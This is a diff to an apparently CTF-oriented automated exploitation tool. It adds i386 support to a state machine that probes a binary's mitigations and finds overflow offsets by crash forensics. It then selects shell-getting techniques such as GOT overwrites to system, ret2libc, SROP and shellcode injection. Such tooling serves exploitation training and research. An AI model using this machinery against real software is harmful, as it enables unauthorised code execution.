@@ -10,7 +10,8 @@ import time
 from . import color, histedit, i18n
 from .aco import AntColony
 from .debugger import Process
-from .exploits import ExploitContext, all_strategies, cyclic, cyclic_find, p64
+from .exploits import (ExploitContext, all_strategies, cyclic, cyclic_find,
+                       p32, p64)
 from .gadgets import GadgetFinder
 
 
@@ -119,13 +120,15 @@ class FSM:
             self.report_data["result"] = "not_elf"
             return False
         m = self.report_data["mitigations"]
-        m["arch"] = "x86-64"
+        m["arch"] = "i386" if getattr(self.elf, "bits", 64) == 32 else "x86-64"
+        m["bits"] = getattr(self.elf, "bits", 64)
+        m["word"] = 4 if m["bits"] == 32 else 8
         m["pie"] = self.elf.is_pie
         m["nx"] = self.elf.has_nx
         m["execstack"] = self.elf.has_execstack
         m["canary"] = self.elf.canary
         m["relro"] = self.elf.relro
-        self.log.log(State.RECON, f"PIE={m['pie']} NX={m['nx']} Canary={m['canary']} "
+        self.log.log(State.RECON, f"arch={m['arch']} PIE={m['pie']} NX={m['nx']} Canary={m['canary']} "
                                   f"RELRO={m['relro']} execstack={m['execstack']}")
         self.transition("recon", True)
 
@@ -179,7 +182,9 @@ class FSM:
         # ---- legacy linear fallback (safety net) ----
         tried = []
         strategies = [S(ctx) for S in all_strategies()]
-        candidates = [s for s in strategies if s.feasible()]
+        arch = "i386" if getattr(self.elf, "bits", 64) == 32 else "x86-64"
+        arch_blocked = [s.name for s in strategies if not s.supported()]
+        candidates = [s for s in strategies if s.supported() and s.feasible()]
         # order: specific before generic
         prio = {"fmt": 0, "heap": 1, "ret2text": 2, "pivot": 3, "srop": 4,
                 "ret2libc": 5, "one_gadget": 5, "ret2csu": 6, "ret2dlresolve": 6,
@@ -191,6 +196,12 @@ class FSM:
                      styled=color.info(f"feasible strategies: "
                                        f"{color.style([s.name for s in candidates] or 'none', 'bold')}"))
         self.report_data["strategies"] = [s.name for s in candidates]
+        if arch_blocked:
+            self.log.log(State.STRATEGY,
+                         f"{arch}: 仅 64 位实现（暂不支持）: {', '.join(arch_blocked)}",
+                         styled=color.warn(
+                             f"{arch}: 64-bit only (not supported on this arch): "
+                             f"{', '.join(arch_blocked)}"))
         if not candidates:
             self._explain_no_strategy()
 
@@ -331,56 +342,49 @@ class FSM:
         marker probe (stack data copies can mimic the pattern).
         `preamble` models multi-read programs: bytes consumed before the
         overflowing read (the offset is preamble-relative)."""
-        pat = cyclic(700)
         proc = None
         cands = []
+        width = 4 if getattr(self.elf, "bits", 64) == 32 else 8
         try:
             proc = Process(self.path)
             proc.start()
-            proc.send(preamble + pat + b"\n")
+            proc.send(preamble + cyclic(0x400) + b"\n")
             proc.close_stdin()
             ev = proc.cont(timeout=1.5)
             if ev[0] not in ("stop", "trap"):
                 return None                      # branch: no crash at all
             regs = proc.getregs()
 
-            def pat_off(raw):
-                # 8-byte window is unambiguous in our base-26 cyclic; the
-                # 7-byte fallback is accepted only when unique in the pattern
-                b = (raw & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                i = pat.find(b)
-                if i >= 0:
-                    return i
-                j = pat.find(b[:7])
-                if j >= 0 and pat.find(b[:7], j + 1) < 0:
-                    return j
-                return None
-
             # branch 1: rip itself carries the pattern -> exact offset
-            off = pat_off(regs.rip)
-            if off is not None and 0 < off < 600:
+            off = cyclic_find(regs.rip, width=width)
+            if off is not None and off < 0x100000:
                 cands.append(off)
-            # branch 2: saved rbp smashed -> return address sits 8 later
-            off = pat_off(regs.rbp)
-            if off is not None and 0 < off < 600:
-                cands.append(off + 8)
+            # branch 2: saved frame pointer smashed -> return address after it
+            off = cyclic_find(regs.rbp, width=width)
+            if off is not None and off < 0x100000:
+                cands.append(off + width)
             # branch 3: scan stack for the smashed return slot (weakest
             # evidence: stack may hold COPIES of our data, not the slot)
             try:
-                stack = proc.read_mem(regs.rsp, 96)
-                for i in range(0, len(stack) - 7, 8):
-                    j = pat.find(stack[i:i + 8])
-                    if j >= 0 and 0 < j < 600:
+                stack = proc.read_mem(regs.rsp, 128)
+                for i in range(0, len(stack) - width + 1, width):
+                    j = cyclic_find(stack[i:i + width], width=width)
+                    if j is not None and j < 0x100000:
                         cands.append(j)
             except Exception:
                 pass
             proc.kill()
-        except Exception:
+        except Exception as exc:
             if proc:
                 try:
                     proc.kill()
                 except Exception:
                     pass
+            try:
+                self.log.log(State.OFFSET, f"动态取证不可用: {exc}",
+                             styled=color.warn(f"dynamic forensics unavailable: {exc}"))
+            except Exception:
+                pass
         # verification probes: a true offset puts a marker into RIP
         marker = 0xBEEFCAFE
         for cand in dict.fromkeys(cands):
@@ -472,12 +476,14 @@ class FSM:
                       prio=0, zh="崩溃取证推断偏移 (ACO 兜底)",
                       en="crash forensics infers the offset (ACO fallback)"),
             Technique("ret2text", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Text(ctx): _s.run(),
-                      feasible=lambda c: "backdoor" in c.vuln_kinds
+                      feasible=lambda c, _s=Ret2Text(ctx): _s.supported()
+                      and "backdoor" in c.vuln_kinds
                       and not c.elf.is_pie and not c.elf.canary,
                       prio=1, zh="跳转到程序自带后门函数",
                       en="jump to the binary's own backdoor"),
             Technique("heap-leak", [], [CAP_HEAP], lambda c: heap.stage_heap_leak(),
-                      feasible=lambda c: "heap" in c.vuln_kinds, scope=PROCESS,
+                      feasible=lambda c, _s=heap: _s.supported() and "heap" in c.vuln_kinds,
+                      scope=PROCESS,
                       prio=2, zh="UAF 双读推出精确堆地址",
                       en="two UAF reads recover exact heap addresses"),
             Technique("heap-forge", [CAP_HEAP], [CAP_LIBC], lambda c: heap.stage_forge(),
@@ -489,16 +495,17 @@ class FSM:
                       zh="free@GOT 改 system 并触发",
                       en="rewrite free@GOT to system and trigger"),
             Technique("fmt-k", [], [CAP_FMTK], t_fmt_k,
-                      feasible=lambda c: "fmt" in c.vuln_kinds, scope=SESSION,
+                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds,
+                      scope=SESSION,
                       prio=0, zh="%p 喷射定位缓冲区参数位置",
                       en="%p spray locates the buffer's vararg index"),
             Technique("fmt-backdoor", [CAP_FMTK], [CAP_SHELL], t_fmt_backdoor,
-                      feasible=lambda c: "fmt" in c.vuln_kinds
+                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds
                       and "backdoor" in c.vuln_kinds and _relro_open(c),
                       prio=1, zh="%hn 把 printf@GOT 改成后门",
                       en="%hn points printf@GOT at the backdoor"),
             Technique("fmt-leak", [CAP_FMTK], [CAP_LIBC], t_fmt_leak,
-                      feasible=lambda c: "fmt" in c.vuln_kinds
+                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds
                       and _relro_open(c) and c.has_leak_function,
                       scope=PROCESS, prio=3,
                       zh="%k$s 泄露 GOT 里的 libc 地址",
@@ -507,18 +514,19 @@ class FSM:
                       prio=3, zh="printf@GOT 改 system, 输入 /bin/sh 触发",
                       en="printf@GOT -> system; '/bin/sh' input triggers it"),
             Technique("pivot", [CAP_RIP], [CAP_SHELL], lambda c, _s=_pv: _s.run(),
-                      feasible=lambda c, _f=_pv.feasible: _f(), prio=4,
+                      feasible=lambda c, _f=_pv.feasible, _s=_pv: _s.supported() and _f(), prio=4,
                       zh="栈迁移到可写段再 ROP",
                       en="stack pivot into a writable segment, then ROP",
                       preamble=_pv_pre()),
             Technique("srop", [CAP_RIP], [CAP_SHELL], lambda c, _s=SROP(ctx): _s.run(),
-                      feasible=lambda c, _f=SROP(ctx).feasible: _f(), prio=5,
+                      feasible=lambda c, _s=SROP(ctx): _s.supported() and _s.feasible(), prio=5,
                       zh="伪造信号帧 SROP 直接 execve",
                       en="forge a signal frame; SROP execve"),
             Technique("libc-leak", [CAP_RIP], [CAP_LIBC], lambda c: r2l.stage_leak(),
-                      feasible=lambda c: "bof" in c.vuln_kinds
+                      feasible=lambda c, _s=r2l: _s.supported() and "bof" in c.vuln_kinds
                       and not c.elf.is_pie and not c.elf.canary
-                      and c.has_rop_gadgets and bool(c.elf.sym("puts"))
+                      and (c.bits == 32 or c.has_rop_gadgets)
+                      and bool(c.elf.sym("puts"))
                       and bool(c.elf.sym("read")),
                       scope=PROCESS, prio=5,
                       zh="ROP 调 puts 泄露 libc 基址",
@@ -528,31 +536,31 @@ class FSM:
                       zh="system(\"/bin/sh\") 二次返回 getshell",
                       en="system(\"/bin/sh\") on the second return"),
             Technique("syscall", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Syscall(ctx): _s.run(),
-                      feasible=lambda c, _f=Ret2Syscall(ctx).feasible: _f(), prio=6,
+                      feasible=lambda c, _s=Ret2Syscall(ctx): _s.supported() and _s.feasible(), prio=6,
                       zh="纯 ROP 链 syscall execve",
                       en="pure ROP chain syscall execve"),
             Technique("shellcode", [CAP_RIP], [CAP_SHELL], lambda c, _s=Shellcode(ctx): _s.run(),
-                      feasible=lambda c, _f=Shellcode(ctx).feasible: _f(), prio=7,
+                      feasible=lambda c, _s=Shellcode(ctx): _s.supported() and _s.feasible(), prio=7,
                       zh="可执行栈注入 shellcode",
                       en="inject shellcode on the exec stack"),
             Technique("one_gadget", [CAP_RIP], [CAP_SHELL],
                       lambda c, _s=Ret2OneGadget(ctx): _s.run(),
-                      feasible=lambda c, _s=Ret2OneGadget(ctx): _s.feasible(),
+                      feasible=lambda c, _s=Ret2OneGadget(ctx): _s.supported() and _s.feasible(),
                       prio=8, zh="泄露 libc 后跳 one_gadget",
                       en="leak libc, jump to a one_gadget"),
             Technique("ret2csu", [CAP_RIP], [CAP_SHELL],
                       lambda c, _s=Ret2CsuOneGadget(ctx): _s.run(),
-                      feasible=lambda c, _s=Ret2CsuOneGadget(ctx): _s.feasible(),
+                      feasible=lambda c, _s=Ret2CsuOneGadget(ctx): _s.supported() and _s.feasible(),
                       prio=8, zh="__libc_csu_init 链泄露 + one_gadget",
                       en="csu-based leak + one_gadget"),
             Technique("dlresolve", [CAP_RIP], [CAP_SHELL],
                       lambda c, _s=Ret2Dlresolve(ctx): _s.run(),
-                      feasible=lambda c, _s=Ret2Dlresolve(ctx): _s.feasible(),
+                      feasible=lambda c, _s=Ret2Dlresolve(ctx): _s.supported() and _s.feasible(),
                       prio=8, zh="ret2dlresolve 解析 system",
                       en="ret2dlresolve resolves system"),
             Technique("offbynull", [], [CAP_SHELL],
                       lambda c, _s=OffByNull(ctx): _s.run(),
-                      feasible=lambda c, _s=OffByNull(ctx): _s.feasible(),
+                      feasible=lambda c, _s=OffByNull(ctx): _s.supported() and _s.feasible(),
                       prio=9, zh="off-by-null 栈重叠跳后门",
                       en="off-by-null stack overlap to the win function"),
             Technique("canary-brute", [], [CAP_SHELL],
@@ -571,6 +579,13 @@ class FSM:
 
     # ------------------------------------------------------------------
     def _explain_no_strategy(self):
+        if getattr(self.elf, "bits", 64) == 32:
+            self.log.log(State.STRATEGY,
+                         "32 位可用路线: ret2text / ret2syscall(int 0x80) / "
+                         "shellcode / ret2libc(cdecl)；fmt/heap/SROP/pivot 仅 64 位",
+                         styled=color.warn(
+                             "i386 routes: ret2text / ret2syscall(int 0x80) / "
+                             "shellcode / ret2libc(cdecl); fmt/heap/SROP/pivot are 64-bit only"))
         """beginner-friendly diagnosis: why is nothing feasible?"""
         zh, en = [], []
         g = self.ctx.gadgets.find_all()
@@ -624,7 +639,8 @@ class FSM:
             lo, hi = max(8, base_guess - 40), base_guess + 120
         else:
             lo, hi = 8, 264
-        dims = [list(range(lo, hi, 8))]
+        step = 4 if getattr(self.elf, "bits", 64) == 32 else 8
+        dims = [list(range(lo, hi, step))]
         self.log.log(State.OFFSET,
                      f"ant colony searching offset in [{lo},{hi}) "
                      f"(static hint: buf~{base_guess})")
@@ -672,7 +688,9 @@ class FSM:
         try:
             proc = Process(self.path)
             proc.start()
-            payload = preamble + cyclic(off) + p64(marker) + b"\n"
+            width = 4 if getattr(self.elf, "bits", 64) == 32 else 8
+            pack = p32 if width == 4 else p64
+            payload = preamble + cyclic(off) + pack(marker) + b"\n"
             proc.send(payload)
             proc.close_stdin()  # EOF: blocked reads return instead of hanging
             ev = proc.cont(timeout=1.5)
@@ -687,7 +705,14 @@ class FSM:
         if regs.rip == marker:
             return 1.0
         # partial credit: marker appears in any register or on stack near rsp
-        if marker in (regs.rdi, regs.rsi, regs.rdx, regs.rax, regs.rbp):
+        regvals = []
+        for name in ("rdi", "rsi", "rdx", "rax", "rcx", "rbp",
+                     "edi", "esi", "edx", "eax", "ecx", "ebp"):
+            try:
+                regvals.append(int(getattr(regs, name)) & 0xFFFFFFFFFFFFFFFF)
+            except AttributeError:
+                pass
+        if marker in regvals:
             return 0.6
         return 0.0
 
@@ -705,11 +730,11 @@ class FSM:
             code = self.elf.read(sym.value, sym.size or 0x100)
             if not code:
                 continue
-            dis = Disasm(code, sym.value)
+            dis = Disasm(code, sym.value, self.elf.bits)
             sub_rsp = None
             max_rbp = 0
             for ins in dis.linear(len(code)):
-                if ins.mnem == "sub" and len(ins.ops) == 2 and ins.ops[0] == "rsp":
+                if ins.mnem == "sub" and len(ins.ops) == 2 and ins.ops[0] in ("rsp", "esp"):
                     try:
                         n = int(ins.ops[1], 16)
                         if 0 < n < 0x400:
@@ -717,13 +742,15 @@ class FSM:
                     except ValueError:
                         pass
                 for op in ins.ops:
-                    if "[rbp-0x" in op:
-                        try:
-                            n = int(op.split("rbp-")[1].rstrip("]"), 16)
-                            max_rbp = max(max_rbp, n)
-                        except ValueError:
-                            pass
+                    for fp in ("rbp-0x", "ebp-0x"):
+                        if fp in op:
+                            try:
+                                n = int(op.split(fp)[1].rstrip("]"), 16)
+                                max_rbp = max(max_rbp, n)
+                            except ValueError:
+                                pass
             hint = sub_rsp or (max_rbp if max_rbp else None)
             if hint and 8 <= hint <= 0x400:
-                return hint + 8  # + saved rbp
+                word = 4 if getattr(self.elf, "bits", 64) == 32 else 8
+                return hint + word  # + saved frame pointer
         return None
